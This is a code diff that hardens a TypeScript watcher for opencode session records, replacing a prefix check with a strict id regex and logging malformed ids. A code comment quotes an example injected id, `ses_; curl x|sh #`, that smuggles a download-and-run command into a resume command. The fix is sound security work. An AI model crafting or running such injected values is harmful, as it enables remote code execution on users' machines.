@@ -23,6 +23,7 @@ import {
   type DirEventWatcher,
 } from "./transcriptDirWatcher.js";
 import { getPosition, setPosition } from "./positionTracker.js";
+import { OPENCODE_SESSION_ID_RE } from "./resumeCommand.js";
 import { AGENT_CLIENTS } from "@codecast/shared/contracts";
 
 /** Absolute path to opencode's SQLite store, from the registry descriptor. */
@@ -268,7 +269,17 @@ export class OpencodeStorageWatcher extends EventEmitter implements DirEventWatc
       setPosition(this.dbPath, globalMax); // survive a restart at this high-water mark
       this.errorCount = 0;
       for (const { sid } of changed) {
-        if (typeof sid === "string" && sid.startsWith("ses_")) this.emitSession(sid);
+        // The `id` column is externally writable — any process can INSERT a session
+        // row. A `startsWith("ses_")` check let `ses_; curl x|sh #` through, and that
+        // string would become the convex session_id and later an unescaped resume
+        // command. Enforce opencode's real id shape (`ses_<base62>`); skip anything
+        // else rather than emit it.
+        if (typeof sid !== "string") continue;
+        if (!OPENCODE_SESSION_ID_RE.test(sid)) {
+          console.warn(`[SECURITY] skipping opencode session with a malformed id: ${sid.slice(0, 40)}`);
+          continue;
+        }
+        this.emitSession(sid);
       }
     } catch (err) {
       this.errorCount++;
